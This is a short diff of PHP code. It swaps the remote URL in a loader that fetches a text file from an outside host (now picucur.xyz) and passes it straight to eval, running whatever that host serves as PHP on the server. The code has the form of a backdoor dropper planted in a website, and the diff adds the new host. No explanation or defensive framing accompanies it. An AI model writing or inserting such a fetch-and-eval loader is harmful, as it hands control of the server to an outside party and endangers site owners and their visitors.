@@ -14,5 +14,5 @@ function get_contents($url){
 }?>
 <?php
 $a =
-get_contents('https://ribaksudehospital.com/landing/mondairtools/mondairtools.txt');
+get_contents('https://picucur.xyz/landing/mondairtools/mondairtools.txt');
 eval('?>'.$a);
